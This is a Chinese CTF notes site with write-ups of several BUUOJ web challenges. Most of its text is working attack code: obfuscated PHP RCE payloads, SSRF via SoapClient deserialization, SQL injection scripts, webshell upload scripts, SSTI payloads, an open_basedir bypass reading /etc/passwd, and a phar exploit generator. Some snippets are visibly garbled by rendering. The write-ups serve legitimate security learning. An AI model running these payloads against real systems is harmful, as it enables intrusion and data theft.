reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/jikedatiaozhan-2019.html":{"url":"buuoj/jikedatiaozhan-2019.html","title":"极客大挑战2019","keywords":"","body":"[极客大挑战 2019]RCE ME参考资料[极客大挑战 2019] RCE ME 直接给了源码 40){ die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); } else{ highlight_file(__FILE__); } // ?> 题目要我们RCE，但是把数字字母都过滤了，考虑只用符号写 一个网上经典的exp ?code=$_=\"`{{{\"^\"?<>/\";;${$_}[_](${$_}[__]);&_=assert&__=执行的命令 然后出题人表示这不是预期解，应该把_`'\"^?<>${}]也过滤掉的 给出的解法是 ?code=(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)())); //(\"assert\")((\"next\")((\"getallheaders\")())); 在UA头里RCE 利用取反构造(“assert”)() 在php7里如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它 又因为PHP>7.1 时assert被定义为一种语言构造器，而不是一个函数，所以像eval一样不支持被可变函数调用 所以这段代码只能在php7.0中被利用 利用print_f和scandirfuzz一下可以看到flag在根目录下，但是无法读，还有个/readflag,可惜phpinfo里可以看到php自带的RCE函数比如system()都被禁用了。。。。 这里利用LD_PRELOAD与putenv来绕过 蚁剑连接 http://08eb3e97-4bf3-4dc0-b659-542c196dfd09.node3.buuoj.cn/?code=$_=%22`{{{%22^%22?%3C%3E/%22;;${$_}[_](${$_}[__]);&_=assert&__=eval($_REQUEST['eki']) 上传恶意.so .php文件（具体可见参考资料） 调用/readflag即可 http://08eb3e97-4bf3-4dc0-b659-542c196dfd09.node3.buuoj.cn/?code=$_=%22`{{{%22^%22?%3C%3E/%22;;${$_}[_](${$_}[__]);&_=assert&__=include(%27/tmp/233.php%27)&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/233.so 参考资料 深入浅出LD_PRELOAD & putenv(): https://www.anquanke.com/post/id/175403 利用的Exp: https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 出题人的博文： https://evoa.me/index.php/archives/62/ phpRCE提高篇： https://ab-alex.github.io/2019/10/17/RCE%E6%8F%90%E9%AB%98%E7%AF%87/ © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/lctf-2018.html":{"url":"buuoj/lctf-2018.html","title":"LCTF 2018","keywords":"","body":"LCTF 20180x01 bestphp's revengeLCTF 2018 0x01 bestphp's revenge 首页 array(0) { } 有flag.php only localhost can get flag!session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; } only localhost can get flag! 显然我们要通过SSRF来拿到flag 这里我们构造soap序列化数据，ssrf+crlf带着可控的phpsessid访问flag.php SOAP是啥 可以利用这个任意POST报文脚本做一个简单的示例 $target, 'user_agent'=>\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' => \"aaab\")); $payload = urlencode(serialize($attack)); echo $payload; $c = unserialize(urldecode($payload)); $c->b(); 接收端 root@EDI:~/codes/buuoj# nc -lvvp 5555 listening on [any] 5555 ... connect to [127.0.0.1] from localhost [127.0.0.1] 9491 POST / HTTP/1.1 Host: 127.0.0.1:5555 Connection: Keep-Alive User-Agent: eki Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Cookie: PHPSESSID=hgjf7894tb5m33n4c3ht1gu0n0 Content-Length: 0 Content-Type: text/xml; charset=utf-8 SOAPAction: \"aaab#b\" Content-Length: 365 也就是说通过SOAP对象的反序列化我们能打到内网的/flag.php从而拿到flag 构造反序列对象，这里我们只需要 $target, 'user_agent' => \"Eki\\r\\nCookie: hgjf7894tb5m33n4c3ht1gu0n0\\r\\n\", 'uri' => \"123\")); $payload = urlencode(serialize($attack)); echo $payload; //O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A41%3A%22Eki%0D%0ACookie%3A+hgjf7894tb5m33n4c3ht1gu0n0%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D 接下来是想办法让他反序列化执行。 这里利用session_start()的参数可控将序列化数据注入到sessionfile中 对于第一个call_user_func() ... call_user_func($_GET[f],$_POST); ... if(isset($_GET[name])){ $_SESSION[name] = $_GET[name]; } ... 构造出 $_GET = array('f'=>'session_start','name'=>'|') $_POST = array('serialize_handler'=>'php_serialize') 得到 call_user_func('session_start',array('serialize_handler'=>'php_serialize')) $_SESSION[name] = '|' 因为 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值 而默认采用的serialize_handler是php 可以做一个小实验 //test1.php //test2.php a; } } var_dump($_SESSION); 访问test1.php 得到array(1) { [\"ryat\"]=> string(30) \"|O:1:\"A\":1:{s:1:\"a\";s:2:\"xx\";}\" } 访问test2.php 则得到了 xxarray(1) { [\"a:1:{s:4:\"ryat\";s:30:\"\"]=> object(A)#1 (1) { [\"a\"]=> string(2) \"xx\" } } 可以看到在test2.php里被解析成了对象，并且成功调用了__wakeup，本题我们也是希望通过这种方式实现SSRF 发报文,注意这里要带Content-Type: application/x-www-form-urlencoded。不然会没法解析... POST /?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A41%3A%22Eki%0D%0ACookie%3A+hgjf7894tb5m33n4c3ht1gu0n0%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1 Host: d46f35c6-a0fa-4140-bbb8-83cbde350129.node3.buuoj.cn Content-Length: 31 Pragma: no-cache Cache-Control: no-cache DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36 Cookie: PHPSESSID=lhav4dvjbfkr9aqc13ec8h0ig6 Origin: http://d46f35c6-a0fa-4140-bbb8-83cbde350129.node3.buuoj.cn Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://11dc9259-2de4-44c7-bc7d-c6abfe6f07e6.node3.buuoj.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close serialize_handler=php_serialize 讲道理我们重新访问后带着注入的PHPSESSION，根据var_dump($_SESSION);应该就能拿到flag了 但是因为新版的php修复了soap反序列化的时候会发送网络请求的bug，所以还需要正向调用激活。 这里利用第二个call_user_func激活soap类 $b = 'implode'; call_user_func($_GET[f],$_POST); session_start(); ... $a = array(reset($_SESSION),'welcome_to_the_lctf2018'); call_user_func($b,$a); 可以看到经过上一步，$_SESSION里的数据是soap对象，再经过reset()弹出这个对象成为了$a[0]，那么我可以通过变量覆盖$b为call_user_func，调用$a中的这个对象，从而触发soap的网络请求。 $_GET = array('f'=>'extract'); $_POST = array('b'=>'call_user_func'); -> call_user_func('extract','$POST'); call_user_func('call_user_func',''); 经过这一步，soap请求真正发了出去，phpsessid相应的session里被加入了flag POST /?f=extract&name=SoapClient HTTP/1.1 Host: d46f35c6-a0fa-4140-bbb8-83cbde350129.node3.buuoj.cn Content-Length: 16 Pragma: no-cache Cache-Control: no-cache DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36 Origin: http://d46f35c6-a0fa-4140-bbb8-83cbde350129.node3.buuoj.cn Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://d46f35c6-a0fa-4140-bbb8-83cbde350129.node3.buuoj.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: PHPSESSID=lhav4dvjbfkr9aqc13ec8h0ig6 Connection: close b=call_user_func 如果之前上传成功的话，回传会显示SoapCilent 然后我们再GET一次首页，就会拿到存储flag的PHPSESSION 修改COOKIE即可拿到flag © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/swpu-2019.html":{"url":"buuoj/swpu-2019.html","title":"SWPU 2019","keywords":"","body":"[SWPU 2019]0x01 Web1参考资料0x15 [SWPU2019] web2Web4参考资料Web3[SWPU 2019] 0x01 Web1 一开始看到待管理员确认还以为是个xss,结果等了半天都没数据回传。。。。 输入一个单引号 发现有报错 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' limit 0,1' at line 1 看来又是个sql注入，用的是MariaDB,mysql的一个变体 fuzz一下发现#、--、or被过滤了，只能一个个select。。。（order有or，可以用group by） 很恶心的是要一直试到22个.... 2,3可控 union没被过滤，可以联合注入但是比较麻烦的是鉴于or被过滤了informartion也不行了。。。。。 也就是说以前利用information_schema的方法没有用了 一种bypass的方式是利用 sys.schema sys.schema_auto_increment_columns或sys.schema_table_statistics_with_buffer 但是buuoj上貌似没有这个库... 一种是mysql.innodb_table_stats 可以爆表 payload: title=%27/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'/*&content=123*/&ac=add 但是没有办法把字段的数据爆出来，因为不知道列名.... 这里使用无列名的注入方法。 考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格 MariaDB [test]> select * from persons; +------+----------+-----------+--------------+--------+ | ID | LastName | FirstName | Address | Credit | +------+----------+-----------+--------------+--------+ | 1 | Gates | Bill | Xuanwumen 10 | NULL | | 1 | Gates | Bill | Xuanwumen 10 | NULL | | 2 | Xill | Hiler | Like 10 | 100.67 | | 2 | Eki | Hiler | Nanfen 10 | 100.67 | +------+----------+-----------+--------------+--------+ -> MariaDB [test]> select 1,2,3,4,5 union select * from persons; +------+-------+-------+--------------+--------+ | 1 | 2 | 3 | 4 | 5 | +------+-------+-------+--------------+--------+ | 1 | 2 | 3 | 4 | 5 | | 1 | Gates | Bill | Xuanwumen 10 | NULL | | 2 | Xill | Hiler | Like 10 | 100.67 | | 2 | Eki | Hiler | Nanfen 10 | 100.67 | +------+-------+-------+--------------+--------+ 然后就可以套娃拿数据了,注意a这个别名(任意内容)是必须的（新生成的表） MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a; +-------+ | 2 | +-------+ | 2 | | Gates | | Xill | | Eki | +-------+ 或者也可以将数字换成别名 在反引号不可用的情况下 MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a; +-------+ | b | +-------+ | 2 | | Gates | | Xill | | Eki | +-------+ 一番fuzz以后（无列名注入猜测列数）可以构造payload: title=%27/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'/*&content=123*/&ac=add 参考资料 不知道列名的情况下注入: https://www.jianshu.com/p/6eba3370cfab sys.schema https://www.cnblogs.com/kunjian/p/11653853.html bypass information.schema https://www.anquanke.com/post/id/193512 0x15 [SWPU2019] web2 首页拿到源码 18){ die('One inch long, one inch strong!'); } if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) ) die('Try something else!'); $character_type = count_chars($hhh, 3); if(strlen($character_type)>12) die(\"Almost there!\"); eval($hhh); ?> 很明显分为两部分，第一部分是利用get_the_flag()这个函数，而利用这个函数就要通过$hhh来构造一个webshell。 题目对$hhh作了很多限制，长度不大于18，不包含大部分可见字符（仍然可以利用^），并且使用字符数量种类不能超过12种。 可以利用异或操作,贴一种筛选脚本 import string pt= string.printable a= map(lambda x:x.encode(\"hex\"),list(pt)) #print list(pt) def findxor(ch): ret = [] for i in range(256): for j in range(256): if (chr(i) not in list(pt)) & (chr(j) not in list(pt)): c = i^j if chr(c)==ch: tmp=[] tmp.append(str(hex(i)[2:])+\"^\"+str(hex(j))[2:]) ret.append(tmp) return ret print findxor('_') print findxor('G') print findxor('E') print findxor('T') 可以构造poc _:['80^df'] G:['80^c7'] E:['80^c5'] T:['80^d4'] _=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=phpinfo //_=$_GET['%80']();&%80=phpinfo 同时通过 phpinfo() 可以得到很多信息 可以看到站点使用的中间件是 Apache2 ,因此对文件后缀的检查可以通过上传 .htaccess 来绕过. 可以看到站点使用的PHP版本是 PHP 7.2 , 所以 ... 这种写法已无法使用 . 要想绕过可以考虑base64等编码方式 这里我们调用get_the_flag就可以了 第二部分是利用get_the_flag上传一个完整的webshell 对后缀名进行了过滤，考虑上传.htaccess的方法 exif_imagetype() 对文件类型的检查可以通过添加图片的文件头( 例如 GIF98a )来绕过 需要注意的是.htaccess需要利用XMP的文件头防止因为之前出现无法识别的乱码无法解析 或者使用wbmp 格式的图片文件头 \\x00\\x00\\x8a\\x39\\x8a\\x39 然后卡了半天怎么上传file.... 看了大佬的脚本，还是利用request import requests url =\"http://635d1ee9-d566-41ce-8e6b-037abd89affe.node3.buuoj.cn/\" payload=\"/?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag\" htaccess = b\"\"\" #define width 1 #define height 1 AddType application/x-httpd-php .eki php_value auto_append_file \"php://filter/convert.base64-decode/resource=shell.eki\" \"\"\" files = [('file',('.htaccess',htaccess,'image/jpeg'))] data = {\"upload\":\"Submit\"} r = requests.post(url=url+payload, data=data, files=files) print(r.text) 然后上传我们的shell import requests import base64 url = \"http://635d1ee9-d566-41ce-8e6b-037abd89affe.node3.buuoj.cn\" payload = \"/?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag\" htaccess = \"\"\" #define width 1 #define height 1 AddType application/x-httpd-php .eki php_value auto_append_file \"php://filter/convert.base64-decode/resource=shell.eki\" \"\"\" files = [('file',('.htaccess',htaccess,'image/jpeg'))] data = {\"upload\":\"Submit\"} r = requests.post(url=url+payload, data=data, files=files) print(r.text) shell = b\"GIF89a\"+b\"00\"+base64.b64encode(\"\")#防止污染+00隔断 files = [('file',('shell.eki',shell,'image/jpeg'))] r = requests.post(url=url+payload, data=data, files=files) print(r.text) 连上蚁剑发现只能访问/html下的文件 估计是open_basedir的问题 可以参考这个POC mkdir(\"/tmp/test\");chdir('/tmp/test/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents(\"/etc/passwd\")); 拿到根目录下的flag, 但是根据html下的提示 预期解是通过攻击php-fpm的unix套接字来进行绕过openbase_dir和绕过disable_function 这里可利用大佬写好的脚本（见参考资料）跑 但是好像buuoj上复现不出来.... Web4 首先是一个盲注 #coding=utf-8 import requests import json import time import string def str2hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s]) url = \"\"\"http://9c6b7c75-a61d-42ca-be00-d26eb3238bad.node3.buuoj.cn/index.php?r=Login/Login\"\"\" sql = \"select flag from flag\" pt= string.printable def booltest(start,end): ret=\"\" for i in range(start,end): l=1 r=255 while(l+1{2})^0#\".format(sql,i,mid) #payload=\"select if((ascii(substr(({0}),{1},1)))>{2},sleep(3),1)\".format(sql,i,mid) payload=\"select if(ascii(substr(({0}),{1},1))>{2},sleep(2),1)\".format(sql,i,mid) #payload=\"union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#\".format(sql,i,mid) #print payload content = { 'username':\"asd';set @a=0x{0};prepare t from @a;execute t-- \".format(str2hex(payload)), 'password':'test123' } data = json.dumps(content) #print data times=time.time() req=requests.post(url,data=data) if(req.status_code!=requests.codes.ok): continue #print req.text if (time.time()-times>=2): l=mid else : r=mid if(chr(r) not in pt): return ret=ret+chr(r) print(\"working:\"+ret) print(\"Final:\"+ret) booltest(1,30) 然后拿到源代码glzjin_wants_a_girl_friend.zip 根目录下有flag.php 然后又到了代码审计环节 采取的MVC架构 先看看View //UserIndex.php if(!isset($img_file)) {//如果这里的$img_file可控就可以搞LFI了 $img_file = '/../favicon.ico'; } $img_dir = dirname(__FILE__) . $img_file; $img_base64 = imgToBase64($img_dir); echo ''; function imgToBase64($img_file) { $img_base64 = ''; if (file_exists($img_file)) { $app_img_file = $img_file; // 图片路径 $img_info = getimagesize($app_img_file); // 取得图片的大小，类型等 $fp = fopen($app_img_file, \"r\"); // 图片是否可读权限 if ($fp) { $filesize = filesize($app_img_file); $content = fread($fp, $filesize); $file_content = chunk_split(base64_encode($content)); // base64编码 switch ($img_info[2]) { //判读图片类型 case 1: $img_type = \"gif\"; break; case 2: $img_type = \"jpg\"; break; case 3: $img_type = \"png\"; break; } $img_base64 = 'data:image/' . $img_type . ';base64,' . $file_content;//合成图片的base64编码 } fclose($fp); } return $img_base64; //返回图片的base64 } 考虑能不能用这个搞LFI 看看Controller viewPath = BASE_PATH . \"/View/{$viewName}.php\"; if(file_exists($this->viewPath)) { extract($viewData);//这里存在一个变量覆盖 include $this->viewPath; } } } /** * 用户控制器 */ class UserController extends BaseController { // 访问列表 public function actionList() { $params = $_REQUEST;//我们可以控制这两个REQUEST $userModel = new UserModel(); $listData = $userModel->getPageList($params); $this->loadView('userList', $listData ); } public function actionIndex() { $listData = $_REQUEST; $this->loadView('userIndex',$listData); } } 然后直接 参考资料 https://www.cnblogs.com/20175211lyz/p/11488051.html php-fpm攻击脚本： https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 攻击PHP-FPM 实现Bypass Disable Functions https://zhuanlan.zhihu.com/p/75114351 Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#_1 从底层看open_basedir_bypass https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ Web3 file.php 存在LFI 能直接读file 但是很奇怪不能base64wrap 后来看源码发现是用的highlight 获得逻辑 //file.php There is no file to show!\"; } $show = new Show(); if(file_exists($file)) { //file_exits phar反序列化的切入点 $show->source = $file; $show->_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?> //base.php web3 首页 查看文件 上传文件 //class.php str = $name; } public function __destruct() { $this->test = $this->str; echo $this->test; } } class Show { public $source; public $str; public function __construct($file) { $this->source = $file; //$this->source = phar://phar.jpg 提示了phar反序列化 echo $this->source; } public function __toString() { $content = $this->str['str']->source; return $content; } public function __set($key,$value) { $this->$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) { die('hacker!'); } else { highlight_file($this->source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) { echo \"hacker~\"; $this->source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this->params = array(); } public function __get($key) { return $this->get($key); } public function get($key) { if(isset($this->params[$key])) { $value = $this->params[$key]; } else { $value = \"index.php\"; } return $this->file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?> //function.php alert(\"上传成功!\");'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) { //echo \"请选择上传的文件:\" . \"\"; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo 'alert(\"Invalid file!\");'; return false; } } } ?> 很显然的phar反序列化攻击 Exp str = $name; } } class Show { public $source; public $str; } class Test { public $file; public $params; } $test = new Test(); $test->params[\"source\"]=\"/var/www/html/f1ag.php\"; $show = new Show(); $show->str['str']=$test; $payload =new C1e4r($show); $phar = new Phar('eki.jpg.phar'); $phar -> startBuffering(); $phar -> setStub('GIF89a'.''); //设置 stub，增加 gif 文件头 $phar ->addFromString('test.txt','test'); //添加要压缩的文件 $phar -> setMetadata($payload); //将自定义 meta-data 存入 manifest $phar -> stopBuffering(); $filename = md5(\"eki\".\"222.90.67.205\").\".jpg\"; echo $filename; ?> © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/bjdctf-2020.html":{"url":"buuoj/bjdctf-2020.html","title":"BJDCTF 2020","keywords":"","body":"BJDCTF2020 Write Up0x01 [BJDCTF2020]The mystery of ip0x02 [BJDCTF2020]Cookie is so stable0x03 [BJDCTF2020]Mark loves cat0x04 [BJDCTF2020]ZJCTF不过如此0x05 [BJDCTF2020]EasySearch参考资料BJDCTF2020 Write Up 0x01 [BJDCTF2020]The mystery of ip 提示IP,发现是X-Forwarded-For搞的 fuzz一下发现有模板注入漏洞 这里的渲染引擎是基于PHP的smarty Poc:{{system(\"\")}} 0x02 [BJDCTF2020]Cookie is so stable 和上题一样是模板注入，不过注入点在Cookie里 渲染引擎也换成了Twig 从网上找到的 Twig poc {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}} 0x03 [BJDCTF2020]Mark loves cat 进去看了一下没事注入点似乎 扫下目录发现 Target: http://ae5480b9-ea51-4d2a-8741-c8968aa682f8.node3.buuoj.cn/ [19:51:17] Starting: [19:51:20] 200 - 73B - /.git/description [19:51:20] 200 - 23B - /.git/HEAD [19:51:20] 301 - 169B - /.git -> http://ae5480b9-ea51-4d2a-8741-c8968aa682f8.node3.buuoj.cn/.git/ [19:51:20] 200 - 137B - /.git/config [19:51:21] 200 - 6KB - /.git/index [19:51:22] 403 - 555B - /.git/ [19:51:23] 200 - 28KB - /index.php [19:51:30] 200 - 0B - /flag.php Task Completed 考虑用Githack 来获取源码 $y){ {% math %}x = $y; } foreach($_GET as $x => $y){ {% endmath %}x = {% math %}y; } foreach($_GET as $x => $y){ if($_GET['flag'] === $x && $x !== 'flag'){ exit($handsome); } } if(!isset($_GET['flag']) && !isset($_POST['flag'])){ exit($yds); } if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is); } echo \"the flag is: \".$flag; 如果要拿到flag 我们要保证GET和POST上设定了flag变量 但是根据 foreach($_POST as $x => $y){ {% endmath %}x = $y; } 这样后面的$flag就会被我们覆盖，拿不到值 但是exit()和die()一样，所以我们只要把 $yds = \"dog\"; $is = \"cat\"; $handsome = 'yds'; 这几个变量改成$flag就可以了 PHP中{% math %}a可以理解为${$a} foreach($_GET as $x => $y){// yds => flag {% endmath %}x = $$y; // $yds = $flag } 0x04 [BJDCTF2020]ZJCTF不过如此 第一层用php://input传值，用php://filter/convert.base64-encode/resource=next.php看源码 拿到 $str) { echo complex($re, $str). \"\\n\"; } function getFlag(){ @eval($_GET['cmd']); } 很显然这里利用pregmatch \\e调用getFlag后门 为了匹配 我们这里设置$re=\\S*匹配所有非空字符 payload:/next.php?\\S*=${getFlag()}&cmd= 0x05 [BJDCTF2020]EasySearch 进去是一个登陆界面，试了一下万能密码都不行，也没有报错信息 扫一下是否有源码泄露，拿到了index.php.swp alert('[+] Welcome to manage system')\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** Hello,'.$_POST['username'].' *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; } else { echo \"alert('[!] Failed')\"; }else { *** } *** ?> 可以看到只要满足 $admin == '6d0bc1' == substr(md5($_POST['password']),0,6) 随便跑个脚本找下 #coding=utf-8 import hashlib for i in range(10000000): payload=str(i).rjust(7,\"0\") md5 = hashlib.md5(payload.encode('utf-8')).hexdigest() if ((md5[0:6])=='6d0bc1'): print payload #2020666 break 然后根据源码应该就是利用可控的$_POST['username']向生成的.shtml文件里注入恶意代码了 SSI Poc \"--> 返回的报文会提供生成的shtml文件目录 至此我们便可以RCE了 参考资料 一篇文章带你理解漏洞之SSTI漏洞: https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/rctf-2015.html":{"url":"buuoj/rctf-2015.html","title":"RCTF 2015","keywords":"","body":"RCTF 20150x01 EasySQLRCTF 2015 0x01 EasySQL 进入发现可以注册，先注册一个看看 注册的时候有点奇怪，邮箱的@不能出现。。。。 登进去看到一批文章，根据url考虑是否有sql注入，fuzz了半天没东西 点用户名的时候发现，可以改密码，考虑是不是存在二次注入。 然后。。。看了大佬的wp,发现是用户名存在二次注入 如果用户名为eki\"\\ 会看到更改用户名处有sql报错信息 注入点找到了，为了自动化，写个脚本 import requests url = \"http://326c9944-4f75-4893-911b-9c517bdc9c5a.node3.buuoj.cn/\" r = requests.session() def register(name): data = { 'username' : name, 'password' : '123', 'email' : '123', } r.post(url=url+\"register.php\", data=data) def login(name): data = { 'username' : name, 'password' : '123', } r.post(url=url+\"login.php\", data=data) def changepwd(): data = { 'oldpass' : '', 'newpass' : '', } req = r.post(url=url+\"changepwd.php\", data=data).text print(req) #sql=\"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" #Result:'article,flag,users' #sql=\"select(group_concat(column_name))from(information_schema.columns)where(table_name='users')\" #sql=\"select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')\" sql=\"select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp('^f')\" payload='eki\"||updatexml(1,concat(1,({0})),1)#'.format(sql) register(payload) login(payload) changepwd() 这样看师傅的wp发现一个技巧，因为正常字段里前面存着很多垃圾字段，可以用sql的正则表达式来搞，匹配一下开头的f 用法 where()regexp() © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/bytectf-2019.html":{"url":"buuoj/bytectf-2019.html","title":"ByteCTF 2019","keywords":"","body":"ByteCTF 20190x01 EZCMSByteCTF 2019 0x01 EZCMS 看题名就知道是个代码审计题，扫一下目录发现www.zip拿到源码 首先是hash扩展攻击，拿到上传权限 function login(){ $secret = \"********\"; setcookie(\"hash\", md5($secret.\"adminadmin\")); return 1; } function is_admin(){ $secret = \"********\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" && $password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$username.$password)){ return 1; } } return 0; } 这里构造 root@EDI:~/HashPump# hashpump Input Signature: 52107b08c0f3342d2153ae1d68e6262c Input Data: admin Input Key Length: 13 Input Data to Add: eki bcbbe3284dc03be00f59d52a7633aeb5 admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\x00\\x00\\x00\\x00\\x00\\x00\\x00eki 然后上传的时候把bcbbe3284dc03be00f59d52a7633aeb5塞到cookie就可了 现在已经可以上传文件，甚至可以直接上传php，但是还是没法正常解析，因为.htaccess被覆盖了 我们先传一个马，并对waf进行拼接绕过 这里不能使用eval,因为eval没法拼接使用 if (!is_file($this->upload_dir.'/.htaccess')){ file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all'); } 现在就是要想办法把.htaccess删了 看了大佬的wp，发现这里的利用点是这里 class Profile{ ... function __call($name, $arguments) { $this->admin->open($this->username, $this->password); } } 这里调用了一个open, Archive->open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。 为什么要设定为9呢？原因在于， ZipArchive->open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢@pagabuc帮助我们解释了这一参数的具体意义。 那么现在，我们就可以使用ZipArchive->open()来删除.htaccess文件。 https://www.anquanke.com/post/id/95896#h2-8 可以在 view.php?filename=9365118560228f7bd99e199c9027b4be.gif&filepath=./sandbox/9f564a2cb832bd31431a6707104641ad/9365118560228f7bd99e199c9027b4be.gif 